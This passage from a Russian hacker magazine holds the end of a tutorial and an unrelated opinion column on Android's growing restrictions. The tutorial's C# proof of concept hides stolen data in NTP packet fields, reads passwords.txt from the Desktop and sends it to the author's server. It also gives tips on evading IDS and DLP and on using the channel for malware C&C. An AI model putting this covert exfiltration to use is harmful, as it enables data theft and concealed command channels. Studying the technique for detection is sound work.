   он разрешает, чтобы его опрашивали.
 • Precision (точность) — число, которое сообщает точность локальных сис‐
   темных часов. Значение равно двоичному логарифму секунд.
 • Root delay (задержка сервера) — время, за которое показания эталон‐
   ных часов доходят до сервера NTP. Зада ется как чис ло секунд с фик‐
   сированной запятой.
 • Root dispersion — раз брос показа ний сервера.
 • RefID (идентификатор источника) — ID часов. Если поле Stratum равно
   единице, то RefID — имя атомных часов (четыре символа ASCII). Если
   текущий сервер NTP использует показания дру гого сервера, то в RefID
   записан IP‐адрес этого сервера.
 • Reference — последние показа ния часов сервера.
 • Originate — время, ког да пакет был отправлен, по версии сервера.
 • Receive — время получения запроса сервером.
 • Transmit — время отправки ответа сервера клиенту, которое заполняет
   клиент.





                    Иллюс тра ция из Wikipedia

В целом процесс крайне прост и понятен, если изучить картинку. Клиент
посылает запрос на сервер, запоминая, когда этот запрос был отправлен.
Сервер принимает пакет, запоминает и записы вает в пакет время приема,
запол няет время отправки и отвечает клиенту. Клиент запоми нает, когда он
получил  ответ, и получа ет нечто вроде RTT (Round‐Trip Time, в прос‐
тонародье — пинг) до сервера. Дальше он определяет, сколько времени
понадобилось пакету, чтобы дойти от сервера обратно ему (время между
запросом и ответом клиента минус время обра бот ки пакета на сервере,
деленное на два).
   Чтобы получить текущее время, нужно прибавить полученную задержку
канала к времени отправки ответа сервером. Вот только UDP на то и UDP, что
задержки могут быть случайные и неп редска зуемые, так что замеры повторя‐
ются по многу раз в день, вычисляется средняя ошиб ка, и локальные часы
корректируются.


ОГРАНИЧЕНИЯ НА ТРАФИК ПО ПОРТУ UDP-123
Системы обнаружения вторжений не такие глупые, какими могут показаться,
так что просто пустить тра фик, например, OpenVPN по 123‐му порту UDP мы
не сможем, по крайней мере без риска спа литься. Соответс твие RFC все же
проверяется. Это можно пос мотреть на примере Wireshark.





             Один из NTP‐пакетов, пойманных Wireshark

Придется нам заставить наши пакеты соответство вать RFC. Проще все го
это сделать, назначая некоторые поля по своему усмотрению. Мы можем
внедрить свои данные в поля Transmit и Originate. Пос леднее не впол не
соответствует RFC, но так глубоко проверки обычно не добираются.


КОНЦЕПТ
Идея проста: мы составляем собственный «заряженный» пакет NTP и пыта‐
емся синхронизировать время со сво им сервером. Чтобы не привлекать лиш‐
него внимания к своей передаче, на каж дый зап рос дол жен отправляться
внешне валидный ответ, в котором могут быть инс трукции для клиента (читай:
бота).
   Чтобы всякие там системы предотвращения утечек (DLP) не мешали нам,
можно, например, поксорить наши данные со статическим ключом. Естес‐
твенно, в рамках PoC я не буду это го делать, но в качестве простейшего спо‐
соба сокрытия данных должно сра ботать.
  Для передачи данных с клиента на сервер подходят поля Poll, Originate
и Transmit. Из них Poll пригоден ограниченно, но мы на этом останав‐
ливаться не будем. Если ты задума ешь учесть его ограничение, то имей
в виду, что использовать в этом поле можно толь ко младшие три бита (как я
понял из докумен тации). Без учета этого мы можем использовать 17 байт
из 48 (35% всего объема пакета) на отправку данных, что уже неплохо.
  А что на прием? Сервер заполняет поля Precision, Root delay, Root
dispersion, Reference, RefID, Receive и, ограниченно, Poll. На ответ сер‐
вера в этом поле распространяются такие же ограниче ния, как на клиента.
Итого имеем 29 (28 без Poll) байт из 48 (60% пакета). Полезный объ ем
пакета — 46 из 48 байт (96%). Оставшиеся два байта — флаги и заголовки,
которые мы менять не можем без вреда для скрытности.


РЕАЛИЗАЦИЯ
Писать код и дебажить наше творение мы будем в Visual Studio. Я использую
версию 2019 Community, благо она бесплатная, а скачать ее можно с сай та
Microsoft.


                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ

 ТУННЕЛЬ ВО ВРЕМЕНИ
          ВЫВОДИМ ДАННЫЕ С КОМПЬЮТЕРА ЧЕРЕЗ
                       NETWORK TIME PROTOCOL





Сервер
Как только IDE установ лена, включена темная тема и любимый плей‐лист,
можно приступать. Для начала соз дадим новый проект типа «консольное при‐
ложение» (мы ведь не пря чемся от юзера) с наз ванием NtpTun_SERVER.





                       Создание проекта

Теперь нам нужна структура, описывающая пакет. Обратившись к специфи‐
кации NTP, напишем прос той класс. В нем также дол жны быть методы упаков‐
ки пакета в массив байтов, пригодный для переда чи настоящему серверу
и для распаковки пришедшего ответа из массива байтов обратно в пакет.


        WWW

                      Весь код, используемый в статье, есть в моем
                      репозитории на GitHub. Он намеренно подпорчен
                      и для промышленного использования не годится,
                      но для демонстрации работы вполне сойдет.





  Объявляем структуру пакета. Не смот ри на странные суф фиксы в наз ‐
  ваниях функций, так задума но

Уже из этого кода видно, что мы будем притворяться сервером Stratum 3.
Если бы мы были Stratum 1, то нужно было бы в поле RefID указывать ID атом‐
ных часов, которых у нас нет. А список серверов первого уровня обще‐
известен, и, если IP нашего псевдосервера не окажется в таких публичных
списках, обман быстро будет рас крыт.
   Stratum 2 не сле дует использовать, потому что тогда RefID дол жен был бы
содержать IP сервера первого уровня, список которых опять же известен.
А вот третий уровень поз воляет ука зывать в RefID IP сервера второго уровня,
полного списка которых  нет. То есть мы сможем в RefID передавать
еще четыре байта произвольных данных.
  Код методов упаковки и распаковки на скрин шот не поместился, к тому же
нам надо разобрать его отдельно. Вот он:


public NtpPacket Parse(byte[] data)
{
  var r = new NtpPacket();
  // NTP packet is 48 bytes long
  r.First8bits = data[0];
  r.Poll = data[2];
  r.Precision = data[3];
  r.RootDelay = BitConverter.ToUInt32(data, 4);
  r.RootDisp = BitConverter.ToUInt32(data, 8);
  r.RefID = BitConverter.ToUInt32(data, 12);
  r.Reference = BitConverter.ToUInt64(data, 16);
  r.Originate = BitConverter.ToUInt64(data, 24);
  r.Receive = BitConverter.ToUInt64(data, 32);
  r.Transmit = BitConverter.ToUInt64(data, 40);
  return r;
}

Тут никаких сложностей: принимаем мас сив байтов и при помощи BitConvert‐
er получаем оттуда данные.


public InPacket GetBuiltInPacketC(byte[] packet)
{
  InPacket _packet = new InPacket();
  NtpPacket ntpPacket = this.Parse(packet);
  _packet.PacketID = 0;
  _packet.Data = new byte[17];
  _packet.Data[0] = ntpPacket.Poll;
  BitConverter.GetBytes(ntpPacket.Originate).CopyTo(_packet.Data, 1);
  BitConverter.GetBytes(ntpPacket.Transmit).CopyTo(_packet.Data, 9);
  return _packet;
}

Структура InPacket описывает пакет, инкапсу лированный в сообщение NTP.
У него есть ID и полезные данные. ID нужен, чтобы сервер мог отчитаться, что
получил пакет, и чтобы клиент мог его перес лать в слу чае ошибки доставки.
Кроме того, не забываем, что в качестве транспорта мы используем UDP,
поэтому не исключены потери и доставка не в том порядке, в котором пакеты
были отправ лены.


public NtpPacket EmbedDataToPacketS(byte[] data)
{
  var nd = new byte[30]; //Max 30 bytes of data in response
  data.CopyTo(nd, 0);
  data = nd;
  NtpPacket result = new NtpPacket();
  result.First8bits = 0x1B;
  result.Poll = data[0];
  result.Precision = data[1];
  result.RootDelay = BitConverter.ToUInt32(data, 2);
  result.RootDisp = BitConverter.ToUInt32(data, 6);
  result.RefID = BitConverter.ToUInt32(data, 10);
  result.Reference = BitConverter.ToUInt64(data, 14);
  result.Receive = BitConverter.ToUInt64(data, 22);
  return result;
}

В этом коде мы видим внедрение данных в пакет. Строка data.CopyTo(nd,
0) нужна для того, чтобы функция корректно отработала, даже если передать
ей не ровно 30 байт, а мень ше. Дальше мы видим стандартную сборку
пакета.
   Тебя, возможно, заинтересо вали эти странные суффиксы в названиях
функций. Я добавил их, чтобы в коде можно было визуально различить фун‐
кции клиента и сервера. Суффикс C означает, что пакет был собран клиентом,
а S — сервером.
  Сервер должен уметь только рас паковать данные, внед ренные клиентом,
и собрать свой пакет с ответом. А клиент должен уметь закинуть данные
в пакет в свои поля и распарсить ответ сервера. Таким образом, у сервера
будет одна копия этого файла (со своими функциями), а у клиента другая.


public byte[] BuildPacket()
{
  byte[] arr = new byte[48];
  arr[0] = First8bits;
  arr[1] = Stratum;
  arr[2] = Poll;
  arr[3] = Precision;
  BitConverter.GetBytes(RootDelay).CopyTo(arr, 4);
  BitConverter.GetBytes(RefID).CopyTo(arr, 8);
  BitConverter.GetBytes(Reference).CopyTo(arr, 12);
  BitConverter.GetBytes(Originate).CopyTo(arr, 20);
  BitConverter.GetBytes(Receive).CopyTo(arr, 28);
  BitConverter.GetBytes(Transmit).CopyTo(arr, 36);
  return arr;
}

Название последней функции говорит само за себя. Она собирает пакет
в массив байтов для отправки. Структура пакета клиента и сервера одинако‐
ва, что снимает некото рые сложности при сборке пакетов на клиенте и сер‐
вере. Но разница все‐таки есть, ведь один из битов заголовка указывает
на режим (клиент/сервер), и для большей скрытности не следует об этом
забывать.
  Следующая проб лема, с которой я столкнулся при реализации PoC, сос‐
тоит в том, что сокеты UDP в C# исключительно однонаправленные. Поэтому
встала задача сделать сокет двунап равлен ным. Решается это прос тым кос‐
тылем: мы делаем два сокета на одном пор те и устанавливаем для обоих
флаг ReuseAddress в true. При желании это можно завернуть в один класс,
но я делать этого не стал, пос кольку лучший код — это код, который никто
не понимает.
  В сервере дальше объяснять нечего, если у тебя возникнут какие‐то воп‐
росы — не стесняйся задавать их в коммента риях.
  При запуске наш псевдосервер спросит, на каком интерфейсе слушать
и какой порт использовать. Пос ле это го появится штатный запрос Windows
Firewall, в котором тебе надо будет предос тавить доступ нашему приложе нию.
Все, теперь PoC будет запущен и готов к при нятию соединения.





            Запрос от Windows Firewall. Нажми Allow access





                       Сер вер запущен


Клиент
Сервер готов, дело за клиентом. Давай сразу договоримся, что наша цель —
организовать передачу данных только от клиента к серверу. Отве ты нас
не интересуют, так как мы не интерактивный шелл делаем, а прос то крадем
содержимое файла passwords.txt, лежащего на рабочем столе юзе ра.
   Это значит, что оговоренный выше костыль в виде двух сокетов UDP
на одном порте нам не понадобится. Если у тебя будет желание повозиться
с этим — один из вариантов реализации я предложил. Другой состоит
в отправке пакетов UDP не из сокета, а через PcapNet, что, правда, тре бует
установки драйвера на клиент ской машине. Сейчас для нас это не проблема,
поскольку мы тестируем все только на своих машинах, но для пентестов этот
способ явно не годится.
  Лирическое отступление закончено, теперь кодим. Создавай новый про‐
ект, я назвал его NtpTun_Client. Красивую псевдогра фику в консоли, со все‐
ми приглашениями, ты, думаю, и сам сделаешь, а если не справишься — заг‐
ляни в мой репозиторий, там есть мой вариант клиента.
  Сразу предлагаю обратить внимание на отличия между клас сами Ntp‐
Client на сервере и клиенте. Клиент пакует данные в свои поля (напомню,
это Poll, Originate и Transmit), а сервер — в свои  (Precision, Root
delay, Root dispersion, Reference, RefID, Receive). И не забудь про флаг
в поле Mode (клиент/сервер), а то у Wireshark и других средств анализа воз‐
никнут справедливые вопросы. Если тебе лень читать документацию, то зна‐
чение первого байта пакета у клиента должно быть 0x1B, а у сервера — 0x1C.
Реализацию  EmbedDataToPacketC  и  GetBuiltInPacketS  привожу   тут,
за остальным опять же отсылаю на мой гитхаб.
   Алгоритм действий клиента прост, но в то же время требует некоторых
разъяснений.
  Сначала необходимо получить приватные данные. Я не буду изобретать
велосипед, так что пусть это будет содержимое файла passwords.txt
с рабочего стола юзера. И не говори, что не пользовался таким «парольным
менеджером»!


String path = Path.Combine(Environment.GetFolderPath(Environment.
SpecialFolder.Desktop), "passwords.txt");
String contents = File.ReadAllText(path);


             INFO

                       Этот  код  заодно  демонстрирует  правильную
                       работу с путями. Складывать их как строки — дур‐
                      ной тон, и такой код плохо переносится. Path.
                   Combine — наш выбор!


Далее в коде ты можешь увидеть странную строчку:


contents += "TRANSFER COMPLETE";

Ее суть заключается в том, что отпра вить лишний пакет нам не жал ко, а если
файл, который мы отправляем, был пустым или меньше 17 байт длиной, то
следующий пункт нашего алго ритма не выполнится. Поэтому мы предполага‐
ем худший вариант развития событий и добавляем «хвост», чтобы гаран‐
тированно отправить хотя бы один пакет.
  Следующий финт ушами — разбива ем данные на блоки по 17 байт. Я
не придумал ничего лучше, чем завес ти спи сок байтовых массивов и добав‐
лять в массив байты по одному в цикле.


int ctr = 0;
List<byte[]> pcs = new List<byte[]>();
int BYTE_CNT = 17;
byte[] current = new byte[BYTE_CNT];
foreach (var cb in Encoding.ASCII.GetBytes(contents))
{
  if (ctr == BYTE_CNT)
  {
    // BYTE_CNT bytes added, start new iteration
    byte[] bf = new byte[BYTE_CNT];
    current.CopyTo(bf, 0);
    pcs.Add(bf);
    String deb = Encoding.ASCII.GetString(bf);
    ctr = 0;
    for (int i = 0; i < BYTE_CNT; i++) current[i] = 0x0;
  }
  if (cb == '\n' || cb == '\r')
  {
    current[ctr] = Encoding.ASCII.GetBytes("_")[0];
  }
  else current[ctr] = cb;
  ctr++;
}

Переменная BYTE_CNT нуж на на случай, если ты решишь паковать не по 17, а,
например, по 11 байт.
   Вот все и готово. Фасу ем наши блоки данных по пакетикам пакетам NTP
и отправляем. Дальше происходит задержка (я взял 200 мс, можно меньше),
чтобы данные отправлялись синхронно и в том же порядке, в каком пакеты
поставлены в очередь отправки. Эта необходимость связана с внутренним
устройством класса UDPSocket: там использует ся асинхронная отправка.
Таким образом, задержка поз воляет почти гарантировать, что отправка
выпол нится в нужном порядке.
  Реализация этого чуда инженерной мысли находится в файле Program.cs
проекта NtpTun_CLIENT, найти который ты можешь все в том же репозитории.
  Для удобства исполь зования и отладки клиент также выводит некоторое
количество вспомогательных данных, таких как скорость отправки пакетов.
Она учитывает упомянутую выше задержку, так что скорость выходит доволь‐
но небольшая. Бенчмарк (смотри раз дел о производительности ниже)
не добавляет задержку, что позволяет зна чительно увеличить пропускную
способность тун неля.
  Выглядит финальный результат как на скрин шотах.





                          Клиент работает





                       Сер вер — тоже


          PowershellКли ент на
В теории никто не мешает нам сделать то же самое в виде скрипта на Power‐
shell, чтобы не таскать с собой приличного раз мера бинарник. «Пошик» есть
на всех машинах с Windows 7 и выше, если его не выковы ряли из системы
руками. Получается, что мы имеем воз можность запус тить наш скрипт даже
без файла. Я не мастер Powershell, но, если ты в нем разбираешься, поп‐
робуй и не забудь поделить ся результатами в комментариях.



ТЕСТИРОВАНИЕ С WIRESHARK
Wireshark содер жит встроенные средства разбора пакетов множес тва про‐
токолов. В этом списке есть и NTP. Это значит, что мы можем анализировать
наши пакеты на соот ветствие RFC без напряжения мозговых извилин. Если ты
не хочешь возиться с виртуалками, мож но пос тавить Npcap Loopback Adapder
Driver, идущий в комплекте с Nmap. Он позволяет Wireshark ловить локальный
трафик.





  Wireshark не замечает подвоха, но переда ваемые данные вид ны в тра‐
  фике невооруженным глазом

Данные в PoC передаются только в одну сторону, поэтому пол ноценного
обмена пакетами ты здесь не увидишь. Главное — что наши пакеты опоз‐
наются как вполне обыкновенные и не вызывают ошибок при проверке
на соответствие RFC.


О ПРОИЗВОДИТЕЛЬНОСТИ И СКРЫТНОСТИ
Как у нас дела со скоростью переда чи данных? Ближай ший родственник это‐
го метода — DNS‐тун нелирование показывает симметричную скорость
до 10 Кбайт/с и асимметричную 5 Кбайт/с на прием и до 13 — на отдачу.
Свой метод я протестировал и получил на порядок лучшие результаты, что
меня, конечно, сильно обрадовало.
  Радует и то, что за оптимиза цию клиента я пока даже не брал ся, так что эти
результаты наверняка улучшатся. На скрин шоте ниже показатели скорости
отображают полезную нагрузку, а не полную. То есть 83 Кбайт/с на отдачу —
это 83 Кбайт/с полезных данных, а полная заг рузка будет несколько выше
(программа просто ее не отображает).





            Результаты тес тирова ния про изво дительнос ти

Что касается скрытности, то все на высшем уровне. Даже DNS‐туннель
еще не все защитные средс тва научились находить, а наши «заряженные»
пакеты запалить еще сложнее.


           DNSВ срав нении с
Раз уж мы вспомнили про туннелирование через DNS, то давай разберемся,
почему защита от него не сра ботает против NTP. Даже если пус тить этот тра‐
фик по 53‐му порту UDP, мы не выйдем за «нормальную» длину пакета, а про‐
верка на наличие строк (например, файрвол взду мает искать там запрещен‐
ные слова типа cmd, bash, UserPassword:) не покажет ничего.
   Это в DNS поддомен должен быть строкой. А у нас бинарный протокол, так
что сразу появляется куча возможнос тей сокрытия инте ресных данных.
Это может быть банальный XOR, может быть AES, RC4 и еще много чего.
А если сде лать гибрид (например, получать клю чи шифрования по DNS
и шифровать ими данные в NTP), то у нас будет дешевый и надежный способ
передачи данных из доверенной сети.


В общем, в сов ременных реалиях всерьез рас следовать паразитную нагрузку
на канал в размере нескольких сотен килобит в секунду даже не инте ресно,
так что, даже если и будут замечены аномалии в количестве пакетов NTP, это,
скорее всего, спишут на ошибку.


ПРИМЕНЕНИЕ
Описанный мной метод может применяться как в тестах на проникновение,
так и вирусописателями. Если не оста ется других способов общаться с сер‐
вером C&C, то это на данный момент идеальное решение. Можно создать
публичный сервер NTP, чтобы он отдавал «нормальное» время всем, кроме
нескольких десятков IP‐адресов, с которыми будет общаться по такому тун‐
нелю. Такой сервер никто не запалит извне, поскольку проверка покажет пол‐
ное соответствие стандарту. Главное — не забывай, что за все свои дей ствия
несешь ответственность только ты.


           WARNING

                      Игры с сетевыми пакетами могут привести к неп‐
                        риятностям с твоим провайдером. Думай, с чем
                      ты выходишь в «большой» интернет.



ВЫВОДЫ
Сегодня мы узнали еще один способ вывести украденные данные с компь‐
ютера, и о существовании защитных мер от него мне ничего не известно.
Единственное решение — полностью запретить NTP в сети и выставлять
часы, набирая 100 на телефо не. Также я уверен, что эта техника скоро найдет
широкое применение в раз ного рода ботнетах, стиллерах, бэкдорах и прочих
вредоносах.
GEEK




 КАК МАРКЕТОЛОГИ
        ANDROID  УБИЛИ
     КОЛОНКА ЕВГЕНИЯ ЗОБНИНА





Наверное, все пользователи и разработ‐
чики уже заметили, в какую сторону движет‐
ся развитие Android. Присущие ОС откры‐
тость и широкие возможности медленно
исчезают, а список зап ретов постоянно          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
пополняется. Может показаться, что при‐              zobnin@glc.ru
чина тому — возрастающие требования
безопасности, но если разобраться в ситу‐
ации, то все оказыва ется несколько слож‐
нее.


ЗАКАТ ANDROID
Скажу честно: я всегда с теплотой отзы вался об Android и почти всегда
переходил на сторону ее раз работчиков в спорах «у вас там все тормозит
и течет». Несмотря на множество технических проб лем, ставших следствием
ориентированности ОС на устройства типа BlackBerry и спешки с выпуском
ОС, в целом Android был действительно грамотно спроектированной сис‐
темой с массой интересных техничес ких решений, впоследствии позаимс тво‐
ванных Apple.
  Просто вдумайся: самая ранняя версия ОС уже включала в себя изолиро‐
ванные песочницы для запус ка приложений, общесис темный IPC для переда‐
чи данных между приложениями и вызова их функций, гранулярный контроль
полномочий, реализованный в едином компоненте, регистровую виртуальную
машину в противовес пожирающей память стековой виртуальной машине
Java, модульную систему синхро низации с раз личными сетевыми сервисами
(в том числе сторонними).
  Первая версия Android из коробки имела все средства для соз дания слож‐
ных систем автоматизации (привет, Tasker), альтернатив системным приложе‐
ниям (домашний экран, почтовый клиент, СМС‐мессенджер, диалер, бра‐
узер, клавиатура — все это можно заменить), приложений клас са настольных
(торрент‐клиенты, HTTP/FTP‐серверы, менеджеры файлов, среды разработ‐
ки, приложения для синхрониза ции данных).
   Android был операционной системой, соз данной гиками для гиков, где
пользователь сам контро лировал ОС и сам отвечал за последствия, будь то
севшая батарейка или утечка данных с карты памяти потерянного телефона.
Смартфон  на  Android  был  полнофункциональ ным  аналогом  ноутбука,
налагавшим на пользователя ровно те же обя зательства соблюдения циф‐
ровой гигиены.
  Но вре мена изменились. Из игрушки для гиков смартфоны превратились
в универсальные устройства обмена информацией, платежей и хранения лич‐
ных данных. Сегодняшний пользователь Android не только не понимает зна‐
чения цифровой гигиены, но и нередко не имеет представления о том, что
такое приложение.
  С точки зрения здра вого смысла смартфоны от Apple для такого поль‐
зователя предпочтитель нее. Большая компания, соб равшая в своих сте нах
лучшие умы планеты, гораз до надежнее, чем сам пользователь, позаботится
о его данных, времени работы от батареи и о том, какие приложения стоит
использовать, а какие лучше обхо дить сто роной.
  Проблема толь ко в том, что Apple — пря мой конкурент Google, а слишком
богатая возможностями и открытая платформа в этой конкуренции сос лужит
плохую службу. Боль ше возможностей — более высокая вероятность проб‐
лем. Хочешь устанавливать приложения откуда угодно? Получи малварь в наг‐
рузку. Хочешь поменять звонилку? Жди перехвата звонков и слива данных.
Хочешь приложе ния класса дес ктопных? Попрощайся с батарейкой и получи
бэкдор, который сделает со смартфоном все, что будет угодно.
  Разумеется, бороться с этими проблемами нужно. Вот только выбранные
Google способы решения проблем больше похожи не на борьбу, а на зак‐
ручивание гаек, преследование личных целей и шизофрению.


БОРЬБА ЗА ФАЙЛЫ
Ярчайший пример — карты памяти. С ними всег да были две проблемы:
 • карта памяти может быть извлечена и вставлена в дру гое устройство;
 • другое устрой ство зачастую ничего, кроме FAT32, не поддерживает.

Как результат, нельзя просто так взять и раз граничить права доступа к фай‐
лам на карте памяти (все приложения могут получить доступ ко всем фай лам),
нельзя взять и зашифровать содержимое карты памяти — дру гое устройство
не сможет ее прочитать.
  Изначально Google выб рала вполне логичные методы борьбы с воз‐
можными проблемами. Во‐первых, разработа ли подсистему выборочного
шифрования, которая поз воляла приложениям соз давать на карте памяти
зашифрованные контейнеры для хра нения своих данных. Ключ шифрования
был уникальным, поэто му другие приложения и устройства не могли про‐
читать их содержимое. Во‐вторых, в каж дом удоб ном и неудобном мес те
документации они повторяли, что карта памяти не место надежного хранения
сенситивной информации. Дес кать, фоточки хра нить еще туда‐сюда идея,
а вот информацию о кредитках лучше бы перенести в приватный каталог при‐
ложения.
  А вот дальше в офисы Google, судя по всему, завезли порошок и мозг
инженеров пошел в раз нос. Сначала появился фреймворк SAF (Storage Ac‐
cess Framework), отдавший ОС задачу выбора файлов на карте памяти с воз‐
можностью фильтровать то, что не должно быть видно всем. Затем стало
необходимо подтверждать права на чтение/запись карты памяти. Затем
появился безоговорочный запрет на пря мую запись во внешнюю карту
памяти, а также способ подключить карту памяти как внутреннее хранилище
с форматированием в ext4 и шифрованием (в дру гие устройства уже не вста‐
вишь). Закончилась исто рия подсистемой Scoped Storage, которая точно так
же отграничивает данные одних приложений от дру гих в весьма извращенной
манере.
  И все это сосуществует в одной системе в 2019 году, когда карта памяти
уже, по сути, не нужна и большинству пользователей не пригождается.
Но бороться с утечками хоум‐видео и интимных фоточек почему‐то по‐преж‐
нему необходимо.





      Ненавистный пользователям экран Storage Access Framework


БОРЬБА ЗА КОНФИДЕНЦИАЛЬНОСТЬ
Ладно, карты памяти — больная тема, и здесь у сторонников идеи все зап‐
ретить наверняка найдутся аргументы в пользу всех этих мер. Но что ты ска‐
жешь про доступ к исто рии звонков и СМС? В Android есть вполне себе
легальный API, позволяющий любому приложению прочитать журнал звонков
и содержимое СМС. Страшно? Конечно, поэтому начиная с Android 6 эти API
защищены с помощью пря мого запроса полномочий у пользовате ля.
   Казалось бы, проб лема решена, но Google на этом не остановилась.
В прошлом году вве ли новые правила размещения приложений в Google Play:
если программа не относится к диалерам, СМС‐мессенджерам, ассистен‐
там, инструментам синхро низации данных или автоматизации действий, то
доступ к этим API запрещен. То есть вмес то того, чтобы провести аудит при‐
ложений и выкинуть из магазина те, что исполь зуют API не по назначению,
Google просто вырубила целый лес полезнейших инстру ментов и посеяла
в разработчиках сомнения («А стоит ли мне вкла дывать силы и деньги в раз‐
работку приложения, если в один прекрасный момент Google убьет исполь‐
зуемый им API?»).
  А самое смеш ное в этой истории, что в Android до сих пор существуют API,
позволяющие перехватить управление почти любым приложением (Accessi‐
bilty  Service)  и  рисовать  поверх  экрана  дру гих  приложений  (SYS‐
TEM_ALERT_WINDOW).  Причем  рисовать  могут  любые  установленные
из Google Play приложения и никакие запросы полномочий им делать не нуж‐
но.





              Те самые правила размещения приложений


БОРЬБА ЗА БАТАРЕЙКУ
Ладно, закончим пока с защитой данных и перейдем к сохранению батарей‐
ки. Как я уже говорил, Android проекти ровал ся как операционка, которая
налагает крайне мало огра ничений на разработчиков. Сис тема останав‐
ливала приложения, переходившие в фон, но в то же время откры вала им
доступ к целому букету средств для выполнения действий в любое время: тут
и вейклоки, и фоновые сервисы, и задания по рас писанию. Если поль‐
зователь подходил к выбору приложений ответс твенно, это не создавало
никаких проблем. Грамот ные разработчики не злоупотребляли фоновым
исполнением и при этом могли соз давать действительно полезные инс тру‐
менты вроде систем удален ного управления устрой ством, серверных при‐
ложений, систем автоматизации.
  Разумеется, рядовые пользователи не оценили такой свободы и получили
резкий расход заряда акку мулятора из‐за сотен и тысяч установленных при‐
ложений, каждое из которых могло в любой момент запустить фоновый сер‐
вис. Меньше всего повез ло пользователям из Поднебесной, где нет Google
Play, но есть огромное количес тво низкокачес твенных приложений. Ситуация
была настолько катастро фической, что каждый первый китайский произво‐
дитель начал встраивать в свои про шивки функции подавления фоновой
активности приложений, действующие так агрессивно, что это отражалось
на работе многих извес тных приложений. Особо отметилась в борьбе
за батарейку Huawei, смартфоны которой легко живут от одного заряда два
дня, но превращают использование сторонних приложений в мучение.





                 Топ‐10 магазинов при ложений в Китае

Со временем в гонку включилась сама Google, но выбрала гораз до более
гуманные методы. Так, в Android 4.4 появилась сис тема подавления работы
фоновых приложе ний, но вместо  тупой блокировки работы фонового
исполнения ОС вычисляла наиболее прожорливые приложения и ограничи‐
вала время их работы. В Android 6.0 добавили подсистему Doze, которая
переводила устройство в режим энергосбережения спус тя час бездействия
устройства. Как и в предыду щем случае, работа приложений не подавлялась
полностью, а приглушалась на определен ные промежутки с выделе нием
квантов времени для исполнения. Наконец, в Android 9.0 появился запрет
на работу фоновых сервисов, но с нес колькими оговорками: сервисы могут
работать некоторое время пос ле ухо да при ложения в фон или после получе‐
ния приложением push‐уведомления (огра ничение не касается «видимых»
(foreground) сервисов). Тогда же была разработана функция Adaptive Battery,
использующая нейронную сеть, чтобы предсказывать, какие приложения
будут нужны пользователю в каждый момент времени, и подавлять работу
неиспользуемых приложений.
  В этом случае Google сработа ла дей стви тельно хорошо и не создала
серьезных проблем поль зователям. Пинать их можно только за слишком мед‐
ленную реакцию. В то время пока инженеры Google делали вид, что проб‐
лемы не существует, дру гие компании уже успели «исправить» ее с помощью
кувал ды.


Китай ская кувал да
В баг‐трекере Android есть показательный тикет, из которого можно узнать
много интересного о том, как действуют китай ские производители, чтобы
защитить пользователей от «пло хих» приложений. Здесь и полный запрет
на пробуждение устрой ства, и запрет на отправку широковещательных
интентов (системные сообщения) при выключении экрана (для приложений
не из белого списка), запрет на старт видимых сервисов, и ограничения
на запуск конкретных функций телефона. Этим грешат практически все китай‐
цы: Huawei, Xiaomi, Oppo, OnePlus, Nokia, на телефонах которой работает яко‐
бы чистый Android, и даже не очень китайский Samsung.





  Насколько сильно производители влияют на работу сторонних приложе‐
  ний, источник: dontkillmyapp.com





БОРЬБА С OPEN SOURCE
Google всегда преподносила открытый исходный код в качестве одного
из главных преимуществ Android как платформы. Исходный код доступен
всем, его можно изменять для своих нужд без необ ходимости платить лицен‐
зионные отчисления.
  Однако открытый не озна чает свободный. Да, исходники Android действи‐
тельно доступны всем, да, их можно использовать без ограниче ний и вносить
изменения. Но не существует никакого сообщества, которое бы занималось
принятием решений о дальнейшей судьбе ОС, нет нормальной сис темы при‐
нятия исправлений и расширений ОС от сторонних раз работчиков. Во главе
разработки стоит большая корпорация, руководс твующаяся исключительно
своими интересами и сотрудничающая только с избранными компаниями.
Процесс разработки, по сути, закрыт, так как, за исключением некоторых
изменений, он ведется в стенах компании, а нам оста ется только ждать, пока
Google соизволит выложить код новой версии ОС в свободный дос туп.
  Более того, то, что сегодня принято называть словом Android, — это не
совсем открытый исходный код. Поверх AOSP также работают сервисы
Google, которые, помимо системы син хро низации с облаком, включают
в себя, например, такие важ ные компоненты, как сервис push‐уведомлений
и система определе ния координат по сотовым вышкам и точкам доступа Wi‐
Fi. Google Assistant, который сегодня стал одной из важнейших функций смар‐
тфона, также полностью закрыт и не включен в AOSP. Другие важные функции
ОС также могут быть времен но или постоянно закрыты и заблокированы, как,
например, подсистема Digital Wellbeing, которая появилась в Android 9 и стала
доступной сторонним разработчикам только в Android 10. Система Motion
Sense не просто закрытый компонент, дос тупный только пользователям Pixel
4, — она недоступна для сторонних раз работчиков (у нее нет открытого API).
  Почему все это так важно? Ведь Google не берет дополнительных денег
за все эти функции, они доступны на всех сертифицированных устройствах,
а тот же Motion Sense закрыт по вполне понят ной коммерческой при чине.
Да просто потому, что большинс тво этих компонентов требуют установки тех
самых сервисов Google, которые автомати чес ки при вязы вают твой смартфон
к корпорации. Хочешь конфиденциальнос ти? Уста нови чистую сборку AOSP
и готовься к тому, что часть приложений на ней не заведется, а остальные
будут работать некор ректно («Хм, у тебя тут нет сервиса push‐уве домлений,
так что не видать тебе уведомлений»).
  Открытый Android нас толь ко же открытый, как Telegram. Да, исходники его
клиента доступны, но без сервера они бес полез ны и отстают на десяток вер‐
сий от официального клиента.


БОРЬБА С РАЗРАБОТЧИКАМИ
В разделе, посвящен ном конфиденциальнос ти, я уже кос нулся того, насколь‐
ко наплевательски Google отно сится к разработчикам. С помощью одно‐
го‐единственного решения она разом угро била множество приложе ний
и оставила программис тов, вложивших силы и день ги в раз витие своих про‐
ектов, не у дел. Точ но так же пос тупа ют с раз работчиками, которые нарушили
какие‐то не очень четко сформулированные пра вила, с разработчиками,
которые просто не удо сужились прочитать новые правила размещения при‐
ложений, с теми, кто использовал не совсем те изображения в качес тве
скриншотов, кто рекламировал собственные приложения. Бам! И твое тво‐
рение просто исчезает из магазина приложений, а на email приходит сооб‐
щение с объяснением причины в две‐три строки. В первый раз тебя прос тят
и позволят восстановить приложение, во второй тоже, а на третий раз твой
аккаунт просто унич тожат без воз можнос ти соз дать новый.
  А самое печальное во всей этой истории, что ты абсолютно беззащитен
и не имеешь права голоса. В свое время я был искренне поражен тем, нас‐
колько команда G Suite, имеющая претензии к исполь зованию сервиса Gmail
в моем приложе нии, может быть терпеливой и умеющей идти на диалог. Нес‐
мотря на то что на все мои воп росы они давали стандартизированные ответы
